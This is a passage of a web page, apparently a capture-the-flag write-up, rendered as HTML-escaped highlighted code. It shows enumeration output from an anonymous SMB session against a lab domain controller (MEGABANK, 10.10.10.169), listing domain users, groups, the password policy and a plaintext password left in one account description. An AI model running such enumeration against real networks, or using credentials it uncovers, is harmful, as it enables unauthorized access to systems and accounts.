&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;194
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;195
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;196
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;197
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;198
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;199
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;200
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;201
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;202
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;203
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;204
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;205
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;206
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;207
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;208
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;209
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;210
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;211
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;212
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;213
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;214
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;215
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;216
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;217
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;218
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;219
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;220
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;221
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;222
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;223
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;224
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;225
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;226
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;227
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;228
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;229
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;230
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;231
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;232
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;233
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;234
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;235
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;236
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;237
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;238
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;239
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;240
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;241
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;242
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;243
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;244
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;245
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;246
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;247
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;248
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;249
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;250
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;251
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;252
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;253
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;254
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;255
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;256
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;257
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;258
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;259
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;260
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;261
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;262
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;263
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;264
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;265
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;266
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;267
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;268
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;269
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;270
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;271
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.169    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Nbtstat Information for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Looking up status of 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;No reply from 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.169 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got domain/workgroup name: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Getting domain SID for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Name: MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Host is part of a domain (not a workgroup)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    OS information on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.169 from smbclient: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.169 from srvinfo:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Users on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[Administrator] rid:[0x1f4]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[Guest] rid:[0x1f5]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[krbtgt] rid:[0x1f6]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[DefaultAccount] rid:[0x1f7]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[ryan] rid:[0x451]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[marko] rid:[0x457]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[sunita] rid:[0x19c9]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[abigail] rid:[0x19ca]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[marcus] rid:[0x19cb]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[sally] rid:[0x19cc]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[fred] rid:[0x19cd]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[angela] rid:[0x19ce]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[felicia] rid:[0x19cf]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[gustavo] rid:[0x19d0]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[ulf] rid:[0x19d1]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[stevie] rid:[0x19d2]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[claire] rid:[0x19d3]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[paulo] rid:[0x19d4]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[steve] rid:[0x19d5]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[annette] rid:[0x19d6]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[annika] rid:[0x19d7]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[per] rid:[0x19d8]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[claude] rid:[0x19d9]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[melanie] rid:[0x2775]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[zach] rid:[0x2776]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[simon] rid:[0x2777]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[naoki] rid:[0x2778]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Share Enumeration on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;SMB1 disabled -- no workgroup available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attempting to map shares on 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Password Policy Information for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attaching to 10.10.10.169 using a NULL share
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Trying protocol 445/SMB...
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Found domain(s):
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Builtin
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Password Info for Domain: MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password length: 7
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password history length: 24
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Maximum password age: Not Set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password Complexity Flags: 000000
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Refuse Password Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Store Cleartext: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Lockout Admins: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Clear Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Anon Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Complex: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password age: 1 day 4 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Reset Account Lockout Counter: 30 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Locked Account Duration: 30 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Account Lockout Threshold: None
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Forced Log off Time: Not Set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Retieved partial password policy with rpcclient:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Groups on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin groups:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Account Operators] rid:[0x224]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Incoming Forest Trust Builders] rid:[0x22d]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Windows Authorization Access Group] rid:[0x230]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Terminal Server License Servers] rid:[0x231]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Administrators] rid:[0x220]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Users] rid:[0x221]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Guests] rid:[0x222]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Print Operators] rid:[0x226]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Backup Operators] rid:[0x227]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Replicator] rid:[0x228]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Desktop Users] rid:[0x22b]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Network Configuration Operators] rid:[0x22c]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Monitor Users] rid:[0x22e]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Log Users] rid:[0x22f]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Distributed COM Users] rid:[0x232]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[IIS_IUSRS] rid:[0x238]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Cryptographic Operators] rid:[0x239]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Event Log Readers] rid:[0x23d]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Certificate Service DCOM Access] rid:[0x23e]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Remote Access Servers] rid:[0x23f]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Endpoint Servers] rid:[0x240]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Management Servers] rid:[0x241]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Hyper-V Administrators] rid:[0x242]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Access Control Assistance Operators] rid:[0x243]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Management Users] rid:[0x244]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[System Managed Accounts Group] rid:[0x245]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Storage Replica Administrators] rid:[0x246]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Server Operators] rid:[0x225]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin group memberships:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;IIS_IUSRS&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 568) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;System Managed Accounts Group&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 581&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 560) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 554&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Remote Management Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 580) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 546&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Event Log Readers&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 545) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Administrators&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 544) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cert Publishers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x205&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RAS and IAS Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x229&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Allowed RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;DnsAdmins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1101&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 572) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
